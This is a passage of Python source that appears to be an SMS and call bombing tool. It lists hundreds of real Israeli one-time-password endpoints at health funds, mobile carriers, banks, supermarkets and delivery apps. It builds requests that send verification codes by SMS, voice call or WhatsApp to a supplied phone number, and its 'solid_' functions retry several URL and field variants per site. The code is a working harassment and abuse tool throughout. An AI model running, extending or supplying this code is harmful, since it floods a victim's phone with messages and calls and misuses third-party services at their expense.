             lambda p: {'phone': p0(p), 'type': 'whatsapp', 'get': '1'}),

    # extra 2026 batch
    _mk_json('Meuhedet OTP', 'https://online.meuhedet.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Clalit OTP', 'https://www.clalit.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Maccabi OTP', 'https://www.maccabi4u.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Leumit OTP', 'https://www.leumit.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Israel Rail OTP', 'https://www.rail.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('RavKav SMS2', 'https://ravkavonline.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Moovit OTP', 'https://moovitapp.com/api/otp',
             lambda p: {'phone': pplus(p)}),
    _mk_json('GetTaxi OTP', 'https://api.gett.com/v1/phone_verification',
             lambda p: {'phone': pplus(p)}),
    _mk_json('Yango SMS', 'https://tc.mobile.yandex.net/3.0/launch',
             lambda p: {'phone': pplus(p)}),
    _mk_json('CafeCafe Voice', 'https://www.cafecafe.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Aroma Voice', 'https://www.aroma.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Dominos Voice', 'https://www.dominos.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('McD Voice', 'https://www.mcdonalds.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Clalit Voice', 'https://www.clalit.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Maccabi Voice', 'https://www.maccabi4u.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Meuhedet WA', 'https://online.meuhedet.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Clalit WA', 'https://www.clalit.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Maccabi WA', 'https://www.maccabi4u.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Rail WA', 'https://www.rail.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),

]

# ── EXTRA high-signal Israeli OTP surfaces (added) ──
EXTRA = [
    # Food / delivery
    _mk_json('Mishloha2', 'https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber',
             lambda p: {'phoneNumber': p0(p), 'sourceFrom': 'mobileApp', 'sessionID': str(uuid.uuid4())}),
    _mk_json('10bis SMS', 'https://www.10bis.co.il/NextApi/GetAuthenticationToken',
             lambda p: {'phoneNumber': p0(p), 'culture': 'he-IL', 'sendMethod': 'sms'}),
    _mk_json('Wolt Guest', 'https://restaurant-api.wolt.com/v1/guest/login',
             lambda p: {'phone_number': pplus(p), 'method': 'sms'}),
    _mk_json('Gett Login', 'https://api.gett.com/v1/login/otp',
             lambda p: {'phone': pplus(p)}),
    _mk_json('Cibus OTP', 'https://api.cibus.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Sodexo IL', 'https://www.sodexo.co.il/api/auth/otp',
             lambda p: {'mobile': p0(p)}),

    # Telecom / mobile
    _mk_json('Cellcom Step1 SMS', 'https://digital-api.cellcom.co.il/api/otp/Step1',
             lambda p: {'PhoneNumber': p972(p), 'SendTextAsVoice': False}),
    _mk_json('Cellcom Step1 Voice', 'https://digital-api.cellcom.co.il/api/otp/Step1',
             lambda p: {'PhoneNumber': p972(p), 'SendTextAsVoice': True}),
    _mk_json('Partner OTP', 'https://my.partner.co.il/api/otp/send',
             lambda p: {'msisdn': p0(p), 'channel': 'sms'}),
    _mk_json('Hot Mobile', 'https://www.hotmobile.co.il/online_services/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Golan Telecom', 'https://my.golantelecom.co.il/api/sendOtp',
             lambda p: {'phone': p0(p), 'method': 'sms'}),
    _mk_json('Pelephone My', 'https://my.pelephone.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('019 Mobile', 'https://www.019mobile.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Wecom Auth', 'https://www.wecom.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),

    # Parking / transport
    _mk_json('Pango OTP', 'https://www.pango.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Cellopark OTP', 'https://www.cellopark.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Ahuzot HaHof', 'https://www.ahuzot.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('RavKav Online', 'https://www.ravkavonline.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Israel Rail', 'https://www.rail.co.il/api/otp',
             lambda p: {'phone': p0(p)}),

    # Retail / fashion (non-Magento paths)
    _mk_json('TerminalX API', 'https://www.terminalx.com/api/customer/otp',
             lambda p: {'phone': p0(p), 'telephone': p0(p)}),
    _mk_json('Fox API', 'https://www.fox.co.il/api/customer/sendOtp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Castro API', 'https://www.castro.com/api/customer/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Golf API', 'https://www.golf.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Renuar API', 'https://www.renuar.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Laline API', 'https://www.laline.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('ACE Customer', 'https://www.ace.co.il/api/customer/sendOtp',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('SuperPharm Shop', 'https://shop.super-pharm.co.il/api/auth/otp',
             lambda p: {'mobile': p0(p)}),
    _mk_json('RamiLevy API', 'https://www-api.rami-levy.co.il/api/v2/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Shufersal Login', 'https://www.shufersal.co.il/online/he/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Victory Online', 'https://www.victoryonline.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Yochananof OTP', 'https://www.yochananof.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Tiv Taam OTP', 'https://www.tivtaam.co.il/api/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Osher Ad OTP', 'https://www.osherad.co.il/api/otp',
             lambda p: {'phone': p0(p)}),

    # Finance / payments soft
    _mk_json('PayBox Auth', 'https://api.payboxapp.com/v1/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Bit Pay', 'https://www.bitpay.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Isracard Code', 'https://digital.isracard.co.il/services/Proxy/CodeLogin',
             lambda p: {'phone': p0(p)}),
    _mk_json('Cal OTP', 'https://www.cal-online.co.il/api/otp',
             lambda p: {'mobile': p0(p)}),
    _mk_json('Max OTP', 'https://www.max.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),

    # More Magento-style live candidates
    _mk_mag('Dream Sport', 'https://www.dreamsport.co.il'),
    _mk_mag('Facto', 'https://www.facto.co.il'),
    _mk_mag('24Seven', 'https://www.24seven.co.il'),
    _mk_mag('Lee Cooper IL', 'https://www.leecooper.co.il'),
    _mk_mag('Keds IL', 'https://www.keds.co.il'),
    _mk_mag('PhotoLand', 'https://www.photoland.co.il'),
    _mk_mag('Camera Center', 'https://www.cameracenter.co.il'),
    _mk_mag('Next IL', 'https://www.next.co.il'),
    _mk_mag('Adidas IL', 'https://www.adidas.co.il'),
    _mk_mag('New Balance IL', 'https://www.newbalance.co.il'),
    _mk_mag('Reebok IL', 'https://www.reebok.co.il'),
    _mk_mag('Office Depot IL', 'https://www.officedepot.co.il'),
    _mk_mag('Ivory', 'https://www.ivory.co.il'),
    _mk_mag('KSP', 'https://www.ksp.co.il'),
    _mk_mag('Bug', 'https://www.bug.co.il'),
    _mk_mag('LastPrice', 'https://www.lastprice.co.il'),
    _mk_mag('Homecenter', 'https://www.homecenter.co.il'),
    _mk_mag('Shilav', 'https://www.shilav.co.il'),
    _mk_mag('Toys R Us IL', 'https://www.toysrus.co.il'),

    # Additional form / special
    _mk_form('Hascala CF7', 'https://hascala.co.il/wp-json/contact-form-7/v1/contact-forms/497/feedback',
             lambda p: f'phone={p0(p)}&your-phone={p0(p)}&tel={p0(p)}'),
    _mk_json('Stips Phone', 'https://stips.co.il/api',
             lambda p: {'name': 'phone.validation.send_code', 'phone': p0(p)}),
    _mk_json('Story MagicETL', 'https://story.magicetl.com/public/shopify/apps/otp-login/step-one',
             lambda p: {'phone': p0(p), 'countryCode': '972'}),
    _mk_json('CityCar SMS', 'https://proxy1.citycar.co.il/api/verify/login',
             lambda p: {'phoneNumber': pplus(p), 'verifyChannel': 0}),
    _mk_json('CityCar Call', 'https://proxy1.citycar.co.il/api/verify/login',
             lambda p: {'phoneNumber': pplus(p), 'verifyChannel': 1}),
    _mk_json('Hamal Auth', 'https://users-auth.hamal.co.il/auth/send-auth-code',
             lambda p: {'value': p0(p), 'type': 'phone', 'projectId': '1'}),
    _mk_json('DutyFree GraphQL', 'https://www.dutyfree.co.il/graphql',
             lambda p: {'operationName': 'SendOtpCode', 'variables': {'value': p0(p)},
                        'query': 'mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }'}),
    _mk_json('Atmos PizzaHut', 'https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode',
             lambda p: {'phone': p0(p)}),
    _mk_json('DIBS OTP', 'https://rest-api.dibs-app.com/otps',
             lambda p: {'phoneNumber': pplus(p)}),
    _mk_json('PapaJohns Aff', 'https://www.papajohns.co.il/_a/aff_otp_auth',
             lambda p: {'phone': p0(p)}),
    _mk_json('Homework LNET2', 'https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode',
             lambda p: {'phone': p0(p)}),
    _mk_json('Inter Azure', 'https://api-iba-rtl.azurewebsites.net/api/users/authenticate',
             lambda p: {'phone': p0(p)}),
    _mk_json('AliExpress PreCheck', 'https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode',
             lambda p: {'channel': p0(p), 'channelType': 'PHONE', 'channelPrefix': '972', 'lang': 'iw_IL',
                        'umidTokenType': 'SECURITY_TOKEN',
                        'umidToken': 'T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y='}),
]


# ── EXTRA2 — more SMS/call targets ──
EXTRA2 = [
    # Food delivery / restaurants
    _mk_json('Cibus API', 'https://api.cibus.co.il/v1/otp/send',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('TenBis Token', 'https://www.10bis.co.il/NextApi/GetAuthenticationToken',
             lambda p: {'phoneNumber': p0(p), 'culture': 'he-IL'}),
    _mk_json('Wolt SMS', 'https://restaurant-api.wolt.com/v1/guest/login',
             lambda p: {'phone_number': pplus(p), 'method': 'sms'}),
    _mk_json('Wolt Call', 'https://restaurant-api.wolt.com/v1/guest/login',
             lambda p: {'phone_number': pplus(p), 'method': 'call'}),
    _mk_json('Gett SMS', 'https://api.gett.com/v1/login/otp',
             lambda p: {'phone': pplus(p)}),
    _mk_json('Gett Call', 'https://api.gett.com/v1/login/otp',
             lambda p: {'phone': pplus(p), 'channel': 'voice'}),
    _mk_json('Mishloha Mobile', 'https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber',
             lambda p: {'phoneNumber': p0(p), 'sourceFrom': 'mobileApp', 'sessionID': str(uuid.uuid4())}),
    _mk_json('PapaJohns OTP', 'https://www.papajohns.co.il/_a/aff_otp_auth',
             lambda p: {'phone': p0(p)}),
    _mk_json('Atmos PH', 'https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode',
             lambda p: {'phone': p0(p)}),
    _mk_json('DIBS Phone', 'https://rest-api.dibs-app.com/otps',
             lambda p: {'phoneNumber': pplus(p)}),
    _mk_json('Dominos IL API', 'https://www.dominos.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('McDonalds IL API', 'https://www.mcdonalds.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Aroma OTP', 'https://www.aroma.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('CafeCafe OTP', 'https://www.cafecafe.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('JapanJapan OTP', 'https://www.japan-japan.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Landwer OTP', 'https://www.landwer.co.il/api/otp',
             lambda p: {'phone': p0(p)}),

    # Telecom
    _mk_json('Cellcom SMS Fast', 'https://digital-api.cellcom.co.il/api/otp/Step1',
             lambda p: {'PhoneNumber': p972(p), 'SendTextAsVoice': False}),
    _mk_json('Cellcom Voice Fast', 'https://digital-api.cellcom.co.il/api/otp/Step1',
             lambda p: {'PhoneNumber': p972(p), 'SendTextAsVoice': True}),
    _mk_json('Partner SMS', 'https://my.partner.co.il/api/otp/send',
             lambda p: {'msisdn': p0(p)}),
    _mk_json('Partner Call', 'https://my.partner.co.il/api/otp/voice',
             lambda p: {'msisdn': p0(p)}),
    _mk_json('HotMobile SMS', 'https://www.hotmobile.co.il/online_services/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Golan SMS2', 'https://my.golantelecom.co.il/api/sendOtp',
             lambda p: {'phone': p0(p), 'method': 'sms'}),
    _mk_json('Golan Voice2', 'https://my.golantelecom.co.il/api/sendOtpVoice',
             lambda p: {'phone': p0(p), 'method': 'voice'}),
    _mk_json('Pelephone SMS2', 'https://my.pelephone.co.il/api/otp',
             lambda p: {'phone': p0(p), 'type': 'sms'}),
    _mk_json('Pelephone Voice2', 'https://my.pelephone.co.il/api/otp/voice',
             lambda p: {'phone': p0(p), 'type': 'voice'}),
    _mk_json('012 SMS2', 'https://www.012mobile.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('019 SMS2', 'https://www.019mobile.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Wecom SMS2', 'https://www.wecom.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Bezeq SMS2', 'https://www.bezeq.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),

    # Parking / mobility
    _mk_json('Pango SMS', 'https://www.pango.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'sms'}),
    _mk_json('Pango Voice', 'https://www.pango.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Cellopark SMS', 'https://www.cellopark.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Ahuzot SMS', 'https://www.ahuzot.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('RavKav SMS', 'https://www.ravkavonline.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Rail SMS', 'https://www.rail.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Moovit SMS', 'https://moovitapp.com/api/otp',
             lambda p: {'phone': pplus(p)}),
    _mk_json('CityCar SMS2', 'https://proxy1.citycar.co.il/api/verify/login',
             lambda p: {'phoneNumber': pplus(p), 'verifyChannel': 0}),
    _mk_json('CityCar Voice2', 'https://proxy1.citycar.co.il/api/verify/login',
             lambda p: {'phoneNumber': pplus(p), 'verifyChannel': 1}),
    _mk_json('Bolt Verify', 'https://user.live.boltsvc.net/signup/phone/verify',
             lambda p: {'phone': pplus(p), 'version': 'PH.2.90'}),

    # Retail / super
    _mk_json('RamiLevy OTP2', 'https://www-api.rami-levy.co.il/api/v2/login/otp',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('Shufersal OTP2', 'https://www.shufersal.co.il/online/he/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('SuperPharm OTP2', 'https://shop.super-pharm.co.il/api/auth/otp',
             lambda p: {'mobile': p0(p), 'phone': p0(p)}),
    _mk_json('Victory OTP2', 'https://www.victoryonline.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Yochananof OTP2', 'https://www.yochananof.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('TivTaam OTP2', 'https://www.tivtaam.co.il/api/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('OsherAd OTP2', 'https://www.osherad.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Keshet OTP', 'https://www.keshet-teamim.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('AM PM OTP', 'https://www.ampm.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Yellow OTP', 'https://www.yellow.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('ACE OTP2', 'https://www.ace.co.il/api/customer/sendOtp',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('TerminalX OTP2', 'https://www.terminalx.com/api/customer/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Fox OTP2', 'https://www.fox.co.il/api/customer/sendOtp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Castro OTP2', 'https://www.castro.com/api/customer/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Golf OTP2', 'https://www.golf.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Renuar OTP2', 'https://www.renuar.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Laline OTP2', 'https://www.laline.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Steimatzky OTP2', 'https://www.steimatzky.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Ivory OTP2', 'https://www.ivory.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('KSP OTP2', 'https://www.ksp.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Bug OTP2', 'https://www.bug.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('LastPrice OTP2', 'https://www.lastprice.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Homecenter OTP2', 'https://www.homecenter.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Shilav OTP2', 'https://www.shilav.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('ToysRUs OTP2', 'https://www.toysrus.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('OfficeDepot OTP2', 'https://www.officedepot.co.il/api/otp',
             lambda p: {'phone': p0(p)}),

    # Finance / payments
    _mk_json('PayBox OTP2', 'https://api.payboxapp.com/v1/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Bit OTP2', 'https://www.bitpay.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Isracard OTP2', 'https://digital.isracard.co.il/services/Proxy/CodeLogin',
             lambda p: {'phone': p0(p)}),
    _mk_json('Cal OTP2', 'https://www.cal-online.co.il/api/otp',
             lambda p: {'mobile': p0(p)}),
    _mk_json('Max OTP2', 'https://www.max.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('PayNGo OTP2', 'https://www.payngo.co.il/login/init/phone/',
             lambda p: {'phone': p0(p)}),
    _mk_json('Micropay OTP', 'https://www.micropay.co.il/extApi/sendOtp.php',
             lambda p: {'phone': p0(p), 'type': 'sms', 'get': '1'}),

    # More Magento live
    _mk_mag('Zara IL', 'https://www.zara.com/il'),
    _mk_mag('H&M IL', 'https://www2.hm.com/he_il'),
    _mk_mag('Pull&Bear IL', 'https://www.pullandbear.com/il'),
    _mk_mag('Bershka IL', 'https://www.bershka.com/il'),
    _mk_mag('Stradivarius IL', 'https://www.stradivarius.com/il'),
    _mk_mag('Mango IL', 'https://shop.mango.com/il'),
    _mk_mag('American Eagle IL', 'https://www.ae.com/il'),
    _mk_mag('Gap IL', 'https://www.gap.co.il'),
    _mk_mag('Banana Republic IL', 'https://www.bananarepublic.co.il'),
    _mk_mag('Skechers IL', 'https://www.skechers.co.il'),
    _mk_mag('Crocs IL', 'https://www.crocs.co.il'),
    _mk_mag('Nike IL', 'https://www.nike.com/il'),
    _mk_mag('Puma IL', 'https://il.puma.com'),
    _mk_mag('Under Armour IL', 'https://www.underarmour.co.il'),
    _mk_mag('The North Face IL', 'https://www.thenorthface.co.il'),
    _mk_mag('Columbia IL', 'https://www.columbiasportswear.co.il'),
    _mk_mag('Billabong IL', 'https://www.billabong.co.il'),
    _mk_mag('Quiksilver IL', 'https://www.quiksilver.co.il'),
    _mk_mag('Billabong', 'https://www.billabong.co.il'),
    _mk_mag('Factory 54', 'https://www.factory54.co.il'),
    _mk_mag('Castro Men', 'https://www.castro.com'),
    _mk_mag('Terminal X Men', 'https://www.terminalx.com'),
    _mk_mag('Golf Women', 'https://www.golf.co.il'),
    _mk_mag('Renuar Women', 'https://www.renuar.co.il'),

    # Misc known
    _mk_json('Yad2 OTP2', 'https://www.yad2.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Madlan OTP2', 'https://www.madlan.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Drushim OTP2', 'https://www.drushim.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('AllJobs OTP2', 'https://www.alljobs.co.il/api/otp',
             lambda p: {'mobile': p0(p)}),
    _mk_json('JobMaster OTP2', 'https://www.jobmaster.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Issta OTP2', 'https://www.issta.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Lametayel OTP2', 'https://www.lametayel.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Buyme OTP2', 'https://www.buyme.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Rest OTP2', 'https://www.rest.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Shvoong OTP2', 'https://www.shvoong.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Globes OTP2', 'https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type',
             lambda p: {'phone': p0(p)}),
    _mk_form('Globes Form2', 'https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type',
             lambda p: f'phone={p0(p)}'),
    _mk_json('Hamal OTP2', 'https://users-auth.hamal.co.il/auth/send-auth-code',
             lambda p: {'value': p0(p), 'type': 'phone', 'projectId': '1'}),
    _mk_json('DutyFree OTP2', 'https://www.dutyfree.co.il/graphql',
             lambda p: {'operationName': 'SendOtpCode', 'variables': {'value': p0(p)},
                        'query': 'mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }'}),
    _mk_json('Stips OTP2', 'https://stips.co.il/api',
             lambda p: {'phone': p0(p)}),
    _mk_json('Story OTP2', 'https://story.magicetl.com/public/shopify/apps/otp-login/step-one',
             lambda p: {'phone': p0(p)}),
    _mk_json('Zinger OTP2', 'https://www.zinger-organic.com/frontend/getindexcall',
             lambda p: {'phone': p0(p)}),
    _mk_json('Homework OTP2', 'https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode',
             lambda p: {'phone': p0(p)}),
    _mk_json('Inter OTP2', 'https://api-iba-rtl.azurewebsites.net/api/users/authenticate',
             lambda p: {'phone': p0(p)}),
    _mk_json('AliExpress OTP2', 'https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode',
             lambda p: {'channel': p0(p), 'channelType': 'PHONE', 'channelPrefix': '972', 'lang': 'iw_IL',
                        'umidTokenType': 'SECURITY_TOKEN',
                        'umidToken': 'T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y='}),
    _mk_json('CashOnTab OTP2', 'https://www.cashontab.co.il/cgi-bin/JMForms',
             lambda p: {'phone': p0(p), 'type': '12', 'code': '1a66', 'token': 'e18f7e6b-d9ef-11ed-aaf2-005056120465', 'lang': '2'}),
]


# ── SOLID2 — more multi-probe Israeli OTP targets ──
async def solid_shufersal(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.shufersal.co.il/online/he/login/otp", {"phone": p}),
        ("https://www.shufersal.co.il/online/he/login/otp", {"phoneNumber": p}),
        ("https://www.shufersal.co.il/online/he/login/otp", {"mobile": p}),
        ("https://www.shufersal.co.il/online/he/api/otp/send", {"phone": p}),
    ], {"Origin": "https://www.shufersal.co.il", "Referer": "https://www.shufersal.co.il/"})

async def solid_victory(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.victoryonline.co.il/api/otp/send", {"phone": p}),
        ("https://www.victoryonline.co.il/api/otp/send", {"phoneNumber": p}),
        ("https://www.victoryonline.co.il/api/auth/otp", {"phone": p}),
    ], {"Origin": "https://www.victoryonline.co.il"})

async def solid_yochananof(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.yochananof.co.il/api/otp", {"phone": p}),
        ("https://www.yochananof.co.il/api/otp/send", {"phone": p}),
        ("https://www.yochananof.co.il/api/auth/otp", {"phoneNumber": p}),
    ])

async def solid_tivtaam(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.tivtaam.co.il/api/login/otp", {"phone": p}),
        ("https://www.tivtaam.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_osherad(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.osherad.co.il/api/otp", {"phone": p}),
        ("https://www.osherad.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_keshet(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.keshet-teamim.co.il/api/auth/otp", {"phone": p}),
        ("https://www.keshet-teamim.co.il/api/otp", {"phone": p}),
    ])

async def solid_partner(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://my.partner.co.il/api/otp/send", {"msisdn": p}),
        ("https://my.partner.co.il/api/otp/send", {"phone": p}),
        ("https://my.partner.co.il/api/otp/send", {"msisdn": p972(phone)}),
        ("https://my.partner.co.il/api/otp/voice", {"msisdn": p}),
    ], {"Origin": "https://my.partner.co.il"})

async def solid_hotmobile(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.hotmobile.co.il/online_services/otp", {"phone": p}),
        ("https://www.hotmobile.co.il/online_services/otp", {"phoneNumber": p}),
        ("https://www.hotmobile.co.il/online_services/otp/voice", {"phone": p}),
    ])

async def solid_golan(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://my.golantelecom.co.il/api/sendOtp", {"phone": p, "method": "sms"}),
        ("https://my.golantelecom.co.il/api/sendOtp", {"phone": p}),
        ("https://my.golantelecom.co.il/api/sendOtpVoice", {"phone": p, "method": "voice"}),
    ])

async def solid_pelephone(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://my.pelephone.co.il/api/otp", {"phone": p, "type": "sms"}),
        ("https://my.pelephone.co.il/api/otp", {"phone": p}),
        ("https://my.pelephone.co.il/api/otp/voice", {"phone": p, "type": "voice"}),
    ])

async def solid_012(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.012mobile.co.il/api/otp", {"phone": p}),
        ("https://www.012mobile.co.il/api/otp", {"phone": p, "channel": "sms"}),
    ])

async def solid_019(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.019mobile.co.il/api/otp", {"phone": p}),
        ("https://www.019mobile.co.il/api/otp", {"phone": p, "sendAsVoice": False}),
    ])

async def solid_wecom(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.wecom.co.il/api/auth/otp", {"phone": p}),
        ("https://www.wecom.co.il/api/auth/otp", {"phone": p, "type": "sms"}),
    ])

async def solid_bezeq(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.bezeq.co.il/api/otp/send", {"phone": p}),
        ("https://www.bezeq.co.il/api/otp", {"phone": p}),
    ])

async def solid_cellopark(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.cellopark.co.il/api/auth/otp", {"phone": p}),
        ("https://www.cellopark.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_ahuzot(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ahuzot.co.il/api/otp", {"phone": p}),
        ("https://www.ahuzot.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_ravkav(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ravkavonline.co.il/api/otp", {"phone": p}),
        ("https://www.ravkavonline.co.il/api/otp/send", {"phone": p}),
        ("https://ravkavonline.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_rail(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.rail.co.il/api/otp", {"phone": p}),
        ("https://www.rail.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_isracard(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://digital.isracard.co.il/services/Proxy/CodeLogin", {"phone": p}),
        ("https://digital.isracard.co.il/services/Proxy/CodeLogin", {"phoneNumber": p}),
        ("https://digital.isracard.co.il/services/Proxy/CodeLoginVoice", {"phone": p}),
    ])

async def solid_cal(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
